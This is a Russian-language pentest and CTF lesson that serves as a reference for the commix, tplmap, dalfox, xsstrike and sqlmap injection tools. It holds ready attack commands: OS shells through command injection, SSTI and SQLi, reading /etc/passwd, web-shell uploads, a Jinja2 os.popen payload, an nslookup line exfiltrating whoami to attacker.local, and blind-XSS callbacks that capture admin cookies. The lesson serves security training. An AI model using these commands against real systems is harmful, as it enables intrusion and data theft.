---
id: web-tool-injection-tools
title: "commix, tplmap, dalfox: инструменты инъекций (RCE, SSTI, XSS)"
category: web
parent: web-tools-exploit
difficulty: medium
order: 4
tags: [commix, tplmap, dalfox, xsstrike, ssti, command-injection, xss, rce]
prerequisites: [web-command-injection, web-ssti-core]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "Практический справочник по автоматизации инъекций: command injection (commix), SSTI (tplmap), XSS (dalfox/xsstrike) и RCE через sqlmap --os-shell."
---

Когда признак уязвимости уже виден — эхо команды в ответе, вычисление шаблона, отражение ввода — дальше начинается перебор техник и обход фильтров. Это скучная ручная работа, и её закрывают специализированные сканеры. В этом уроке — полный практический справочник: commix (command injection), tplmap (SSTI), dalfox/xsstrike (XSS) и получение RCE через sqlmap. Минимум теории — максимум флагов и рецептов.

## Шпаргалка: инструмент под класс уязвимости

| Класс / признак | Инструмент | Быстрая команда |
|-----------------|-----------|-----------------|
| Command injection (эхо команды, задержка) | commix | `commix -u 'https://t/ping?host=1' --batch --os-cmd=id` |
| SSTI (`{{7*7}}`→49) | tplmap | `tplmap -u 'https://t/?name=x' --os-shell` |
| XSS (отражение в HTML) | dalfox | `dalfox url 'https://t/?q=x'` |
| Blind XSS | dalfox | `dalfox url 'https://t/feedback?m=x' -b https://xss.me` |
| Контекстный XSS / фаззинг | xsstrike | `xsstrike.py -u 'https://t/?q=x' --fuzzer` |
| SQLi → RCE | sqlmap | `sqlmap -r req.txt -p id --os-cmd=id` |
| SSTI вручную (Jinja2) | curl | `curl 'https://t/?name={{7*7}}'` |

## commix: автоматизация command injection

commix обнаруживает и эксплуатирует инъекции команд. Базовый запуск:

```bash
commix -u 'https://target.local/ping?host=127.0.0.1'
commix --url='https://target.local/ping?host=127.0.0.1' --batch
```

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-u`, `--url` | цель (параметр в URL) | `-u 'https://t/ping?host=1'` |
| `-l`, `--logfile` | цели из лог-файла | `-l access.log` |
| `-m`, `--bulkfile` | список целей из файла | `-m urls.txt` |
| `-r`, `--request` | запрос из файла (как sqlmap) | `-r request.txt` |
| `--data` | POST-данные (форма) | `--data='ip=1&name=x'` |
| `--method` | принудительный HTTP-метод | `--method=PUT` |
| `-p`, `--param` | тестировать конкретный параметр | `-p ip` |
| `--cookie` | cookie | `--cookie='sess=...'` |
| `--headers` | доп. заголовки (`\n`-разделитель) | `--headers='X: 1\nY: 2'` |
| `--user-agent` | свой User-Agent | `--user-agent='Mozilla/5.0'` |
| `--random-agent` | случайный User-Agent | `--random-agent` |
| `--referer` | заголовок Referer | `--referer='https://t/'` |
| `--host` | заголовок Host | `--host='internal.local'` |
| `--proxy` | прокси (Burp) | `--proxy=http://127.0.0.1:8080` |
| `--tor` | через Tor | `--tor` |
| `--auth-type` / `--auth-cred` | HTTP-auth | `--auth-type=Basic --auth-cred=u:p` |
| `--auth-url` / `--auth-data` / `--auth-cookie` | форма логина | `--auth-url=https://t/login` |
| `--force-ssl` | форсировать HTTPS | `--force-ssl` |
| `--ignore-code` | игнорировать HTTP-код | `--ignore-code=403` |
| `--ignore-redirects` | не следовать редиректам | `--ignore-redirects` |
| `--retries` | число повторов при таймауте | `--retries=3` |
| `--technique` | техники: `c` classic, `e` eval, `t` time, `f` file, `b` boolean | `--technique=t` |
| `--prefix` / `--suffix` | префикс/суффикс payload | `--prefix="'"` |
| `--level` / `--risk` | глубина (1–3) | `--level=3 --risk=2` |
| `--os-cmd` | выполнить одну команду | `--os-cmd='id'` |
| `--os-shell` | интерактивный псевдо-shell | `--os-shell` |
| `--file-read` | прочитать файл | `--file-read=/etc/passwd` |
| `--file-write` / `--file-upload` / `--file-dest` | записать/загрузить файл | `--file-upload=sh.php --file-dest=/var/www` |
| `--tamper` | скрипты обхода фильтров | `--tamper=space2ifs` |
| `--delay` | задержка между запросами | `--delay=1` |
| `--time-sec` | секунды задержки (time-based) | `--time-sec=5` |
| `--skip-calc` | пропустить математическую проверку | `--skip-calc` |
| `--skip-waf` | не определять WAF | `--skip-waf` |
| `--skip-heuristics` | пропустить эвристику | `--skip-heuristics` |
| `--os` | форсировать ОС (windows/linux) | `--os=linux` |
| `--batch` | без интерактивных вопросов | `--batch` |
| `--flush-session` | сбросить сессию цели | `--flush-session` |
| `--output-dir` | каталог для логов/сессий | `--output-dir=/tmp/commix` |
| `--verbose` | уровень вывода (1–4) | `--verbose=3` |

Примеры:

```bash
# подтвердить инъекцию и выполнить команду
commix -u 'https://target.local/api/exec?cmd=ls' --batch --os-cmd='id'

# POST-форма с несколькими параметрами
commix -u 'https://target.local/submit' --data='ip=127.0.0.1&name=x' -p ip --batch

# time-based (слепая) инъекция
commix -u 'https://target.local/ping?host=127.0.0.1' --technique=t --batch

# через сохранённый запрос с cookie (из Burp)
commix -r request.txt -p host --batch --os-shell

# обход фильтра пробелов
commix -u 'https://target.local/ping?host=127.0.0.1' --tamper=space2ifs --batch
```

Результат: commix сообщит тип инъекции (`Classic`, `Time-based`), ОС и даст псевдо-shell при `--os-shell`.

## tplmap: SSTI → RCE

tplmap определяет движок шаблонов и эксплуатирует SSTI.

```bash
tplmap -u 'https://target.local/page?name=test'
```

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-u`, `--url` | цель с параметром | `-u 'https://t/?name=x'` |
| `-d`, `--data` | POST-данные | `-d 'tpl=hello'` |
| `-p`, `--param` | конкретный параметр | `-p name` |
| `-H`, `--header` | тестировать заголовок | `-H 'User-Agent: x'` |
| `-C`, `--cookie` | cookie | `-C 'sess=...'` |
| `-P`, `--proxy` | прокси | `-P http://127.0.0.1:8080` |
| `-e`, `--engine` | движок (`jinja2`, `twig`, `freemarker`, `velocity`, `smarty`, `mako`, `erb`, `django`, `nunjucks`, `tornado`, `dust`, `marko`) | `-e jinja2` |
| `-t`, `--technique` | техника инъекции (`R` render, `V` verbose) | `-t R` |
| `--os-shell` | интерактивный shell | `--os-shell` |
| `--os-cmd` | выполнить команду | `--os-cmd 'id'` |
| `--upload` | загрузить файл на цель | `--upload /tmp/sh.php` |
| `--force-overwrite` | перезапись существующих файлов | `--force-overwrite` |
| `--blind` | слепая (boolean) инъекция | `--blind` |
| `--code` | выполнить PHP-код на цели | `--code 'phpinfo();'` |
| `--tpl-shell` | shell на уровне шаблонизатора | `--tpl-shell` |
| `--tpl-code` | код шаблонизатора | `--tpl-code '{{7*7}}'` |
| `--level` | глубина проверки (1–5) | `--level 5` |
| `--injection-tag` | тег для инъекции | `--injection-tag '{*'` |
| `--run` | не интерактивно (выполнить и выйти) | `--run` |
| `-v`, `--verbose` | подробный вывод | `-v` |

Примеры:

```bash
# определить движок и получить shell
tplmap -u 'https://target.local/render?name=test' --os-shell

# выполнить одну команду через найденный движок
tplmap -u 'https://target.local/render?name=test' -e jinja2 --os-cmd 'id'

# POST-параметр
tplmap -u 'https://target.local/api/template' -d 'tpl=hello' -p tpl --os-shell
```

Типовые payload'ы, которые tplmap пробует сам:

```
{{7*7}}            Jinja2/Twig
${7*7}             Freemarker/Velocity/EL
<%= 7*7 %>         ERB
#{7*7}             Ruby
{7*7}              Smarty
```

## dalfox: XSS-сканер

dalfox — быстрый XSS-сканер с поддержкой blind-XSS и WAF-bypass.

```bash
dalfox url 'https://target.local/search?q=test'
```

| Флаг / подкоманда | Что делает | Пример |
|-------------------|-----------|--------|
| `url` | режим: один URL | `dalfox url 'https://t/?q=x'` |
| `pipe` | режим: URL из stdin | `cat urls.txt \| dalfox pipe` |
| `file` | режим: список URL из файла | `dalfox file urls.txt` |
| `sxss` | stored-XSS режим | `dalfox sxss ...` |
| `server` | REST API-сервер | `dalfox server` |
| `payload` | генерация payload | `dalfox payload` |
| `scan` | экспериментальный скан | `dalfox scan` |
| `-p`, `--param` | конкретный параметр | `-p q` |
| `--param-req` | параметр только в запросе | `--param-req q` |
| `--param-resp` | параметр только в ответе | `--param-resp q` |
| `--data` | POST-данные | `--data '{"t":"x"}'` |
| `-H`, `--header` | заголовок | `-H 'Content-Type: application/json'` |
| `-C`, `--cookie` | cookie | `-C 'sess=...'` |
| `-b`, `--blind` | URL blind-XSS коллбэка | `-b https://xss.attacker/cb` |
| `--waf-bypass` / `--waf-evasion` | обход WAF | `--waf-bypass` |
| `--mining-dom` | поиск DOM-XSS | `--mining-dom` |
| `--mining-dict` | словарный майнинг параметров | `--mining-dict` |
| `--deep-domxss` | глубокий DOM-анализ | `--deep-domxss` |
| `-w`, `--custom-payload FILE` | свой список payload | `-w xss.txt` |
| `--only-custom-payload` | только свои payload | `--only-custom-payload` |
| `--skip-bav` | пропустить проверку базовых уязвимостей | `--skip-bav` |
| `--skip-discovery` | пропустить фазу discovery | `--skip-discovery` |
| `--skip-mining-dom` / `--skip-mining-dict` | пропустить майнинг | `--skip-mining-dom` |
| `--skip-grepping` | пропустить grep-фазу | `--skip-grepping` |
| `--only-discovery` | только discovery, без проверки | `--only-discovery` |
| `--remote-payloads` | брать payload из remote-источника | `--remote-payloads portswigger` |
| `--remote-wordlists` | брать словари из remote | `--remote-wordlists burp` |
| `--poc-type` | формат PoC (`plain`, `curl`, `http-request`) | `--poc-type curl` |
| `--found-action` | команда при находке | `--found-action 'notify-send XSS'` |
| `-o`, `--output` | файл результата | `-o xss.json` |
| `--format` | формат вывода (`json`, `plain`, `jsonl`) | `--format json` |
| `--output-all` | писать в output все запросы | `--output-all` |
| `--proxy` | прокси | `--proxy http://127.0.0.1:8080` |
| `-W`, `--workers` | число воркеров | `-W 10` |
| `--timeout` | таймаут запроса (сек) | `--timeout 10` |
| `--delay` | задержка между запросами (мс) | `--delay 100` |
| `--user-agent` | свой User-Agent | `--user-agent 'Mozilla/5.0'` |
| `--follow-redirects` | следовать редиректам | `--follow-redirects` |
| `--ignore-return` | игнорировать URL по regex | `--ignore-return 'logout'` |
| `--silence` | тихий режим | `--silence` |
| `--no-spinner` | без спиннера | `--no-spinner` |
| `--no-color` | без цвета | `--no-color` |
| `--mass` | массовый скан (эксперим.) | `--mass` |
| `--config` | файл конфигурации | `--config dalfox.yaml` |

Примеры:

```bash
# обычный скан с поиском DOM-XSS
dalfox url 'https://target.local/search?q=x' --mining-dom

# blind XSS через свой коллбэк
dalfox url 'https://target.local/feedback?msg=x' --blind 'https://xss.attacker.local/cb'

# POST JSON + WAF-bypass
dalfox url 'https://target.local/api/comment' --data '{"text":"x"}' -H 'Content-Type: application/json' --waf-bypass

# список целей и JSON-вывод
cat urls.txt | dalfox pipe --format json -o xss.json
```

## xsstrike: контекстный анализ XSS

xsstrike анализирует контекст отражения и подбирает payload:

```bash
python3 xsstrike.py -u 'https://target.local/search?q=test'
python3 xsstrike.py -u 'https://target.local/search?q=test' --fuzzer
python3 xsstrike.py -u 'https://target.local/search?q=test' --crawl
```

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-u`, `--url` | целевой URL | `-u 'https://t/?q=x'` |
| `--data` | POST-данные | `--data 'q=x'` |
| `--fuzzer` | режим фаззинга | `--fuzzer` |
| `--crawl` | обойти сайт | `--crawl` |
| `--seeds` | засеять краулер начальными URL | `--seeds seeds.txt` |
| `--fuzz` | только фаззинг без проверки | `--fuzz` |
| `--blind` | blind-XSS | `--blind` |
| `--skip` | пропустить проверку параметров | `--skip` |
| `--skip-dom` | пропустить DOM-анализ | `--skip-dom` |
| `--path` | протестировать путь | `--path` |
| `--encode` | кодировать payload | `--encode` |
| `--headers` | доп. заголовки | `--headers 'X: 1'` |
| `--threads` | число потоков | `--threads 5` |
| `--timeout` | таймаут запроса (сек) | `--timeout 10` |
| `--proxy` | прокси | `--proxy http://127.0.0.1:8080` |
| `--json` | JSON-вывод | `--json` |
| `--update` | обновить инструмент | `--update` |

## sqlmap → RCE: --os-shell и --os-cmd

sqlmap не только дампит БД — при достаточных правах он даёт выполнение команд на ОС.

```bash
# выполнить команду ОС через SQLi
sqlmap -r request.txt -p id --os-cmd 'id'

# интерактивный OS-shell (запись веб-шелла или другой техникой)
sqlmap -r request.txt -p id --os-shell

# явно указать ОС и путь
sqlmap -r request.txt -p id --os-pwn --os-smbrelay
sqlmap -r request.txt -p id --os-shell --web-root '/var/www/html'
```

**Флаги sqlmap для доступа к ОС и файлам:**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `--os-cmd` | выполнить одну команду ОС | `--os-cmd='id'` |
| `--os-shell` | интерактивный OS-shell | `--os-shell` |
| `--os-pwn` | OOB shell / Meterpreter / VNC | `--os-pwn` |
| `--os-smbrelay` | получить shell через SMB relay | `--os-pwn --os-smbrelay` |
| `--os-bof` | буфер-оверфлоу в MySQL/PostgreSQL | `--os-bof` |
| `--priv-esc` | попытка привилегий (Meterpreter) | `--os-pwn --priv-esc` |
| `--msf-path` | путь к Metasploit | `--msf-path=/opt/metasploit` |
| `--tmp-path` | временный каталог на цели | `--tmp-path=/tmp` |
| `--web-root` | web-root для записи шелла | `--web-root=/var/www/html` |
| `--file-read` | прочитать файл на цели | `--file-read=/etc/passwd` |
| `--file-write` | записать файл (локальный) | `--file-write=./sh.php` |
| `--file-dest` | путь назначения на цели | `--file-dest=/var/www/sh.php` |
| `--sql-shell` | интерактивный SQL-shell | `--sql-shell` |
| `--sql-query` | выполнить SQL-запрос | `--sql-query='SELECT ...'` |
| `--eval` | выполнить Python-код перед каждым запросом | `--eval='import ...'` |
| `--udf-inject` / `--shared-lib` | UDF-инъекция из своей .so/.dll | `--shared-lib=lib_mysqludf_sys.so` |
| `--os-cmd` + `--batch` | неинтерактивный запуск | `--os-cmd=id --batch` |
| `--technique` | техника (`BEUSTQ`) | `--technique=U` |
| `--tamper` | обход WAF | `--tamper=space2comment` |

Ограничения: `--os-shell` требует прав (MySQL `FILE`/`SUPER`, MSSQL `sysadmin`, PostgreSQL `pg_execute_server_program` и т.п.) и часто упирается в `secure_file_priv`/`--secure-file-priv`. Если команды не идут — вернитесь к техникам UDF/xp_cmdshell/COPY TO PROGRAM (см. уроки по БД).

## Общий injection toolbelt: что для чего

| Класс уязвимости | Признак | Инструмент |
|------------------|---------|-----------|
| Command injection | в ответе вывод команды, задержка | commix |
| SSTI | `${7*7}` → `49`, `{{7*7}}` | tplmap |
| XSS | отражение ввода в HTML | dalfox, xsstrike |
| Blind XSS | ввод сохраняется и виден админу | dalfox `--blind` + XSS Hunter |
| SQLi → RCE | ошибка SQL, инъекция | sqlmap `--os-shell`/`--os-cmd` |
| Deserialization | base64/сериализованный blob | ysoserial/phpggc (см. `web-tool-deser`) |
| JWT | `eyJ...` в запросе | jwt_tool (см. `web-tool-jwt-tools`) |

## Практические рецепты

**Blind command injection.** Вывод команды не возвращается — используйте time-based и out-of-band:

```bash
# time-based: задержка докажет выполнение
commix -u 'https://target.local/ping?host=127.0.0.1' --technique=t --batch
# out-of-band: обратный DNS/HTTP
# payload: ; nslookup `whoami`.attacker.local
```

**SSTI → RCE в Jinja2 (ручная проверка, если tplmap не сработал):**

```bash
curl -s 'https://target.local/render?name={{7*7}}'          # ищем 49
curl -s 'https://target.local/render?name={{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
```

**Blind XSS через XSS Hunter:** зарегистрируйте коллбэк, передайте его в `dalfox --blind`, и когда админ откроет страницу — получите полный контекст (URL, cookie, DOM).

**Автоматизация с авторизацией:** всегда передавайте cookie/заголовки, иначе сканер упрётся в 401:

```bash
commix -u 'https://target.local/api/exec?cmd=ls' --cookie='session=...' --batch
dalfox url 'https://target.local/profile?bio=x' -H 'Cookie: session=...'
```

## Частые ошибки

- **Запускать сканер без авторизации.** Большинство инъекций за логином — без cookie вы получите 401 и ложный «не найдено».
- **Доверять результату без верификации.** commix/tplmap/dalfox дают false positives; подтверждайте вручную в Repeater.
- **Слепая инъекция без OOB.** Если вывод не возвращается, используйте time-based или внешний коллбэк (Collaborator/XSS Hunter).
- **Игнорировать права БД при `--os-shell`.** Без нужных привилегий команда не выполнится — проверьте права и `secure_file_priv`.
- **Уронить сервис.** Некоторые техники (`--os-pwn`, перезапись файлов) деструктивны — сначала безопасная проверка.
- **Не фиксировать PoC.** Сохраняйте точную команду генерации и запрос для отчёта.

## Квиз

```quiz
- question: "Какой инструмент специализируется на command injection?"
  options:
    - "tplmap"
    - "commix"
    - "dalfox"
    - "ysoserial"
  answer: 1
  explanation: "commix — command injection; tplmap — SSTI, dalfox — XSS."
- question: "Что делает флаг `tplmap --os-shell`?"
  options:
    - "Сканирует порты"
    - "Даёт интерактивный shell через найденный SSTI"
    - "Кодирует payload"
    - "Ищет JWT"
  answer: 1
  explanation: "tplmap определяет движок шаблонов и эксплуатирует SSTI до RCE."
- question: "Какой флаг dalfox передаёт URL для blind-XSS коллбэка?"
  options:
    - "-o"
    - "--blind"
    - "-p"
    - "--proxy"
  answer: 1
  explanation: "`--blind <URL>` — коллбэк, куда придёт сработавший payload."
- question: "Что нужно, чтобы `sqlmap --os-shell` выполнил команду?"
  options:
    - "Только URL"
    - "Права БД (FILE/SUPER/sysadmin) и подходящая техника"
    - "Публичный ключ"
    - "Свой словарь"
  answer: 1
  explanation: "Без привилегий и техники (UDF/xp_cmdshell/COPY) команда не выполнится."
- question: "Как подтвердить слепую command injection, если вывода нет?"
  options:
    - "Никак"
    - "Time-based задержкой или out-of-band (DNS/HTTP) коллбэком"
    - "Сменить User-Agent"
    - "Запустить сканер ещё раз"
  answer: 1
  explanation: "Задержка или обратное DNS/HTTP-обращение доказывают выполнение."
```

## Где пригодится

- **CTF (Web):** быстрый путь от признака инъекции к флагу через автоматизацию.
- **Bug bounty:** command injection и blind XSS — высокооплачиваемые находки; dalfox `--blind` особенно.
- **Пентест:** единый набор сканеров для проверки инъекций и получения доказательств RCE.
- **Работа (AppSec):** понимание техник инъекций улучшает ревью кода и настройку защиты (WAF, санитайзинг).
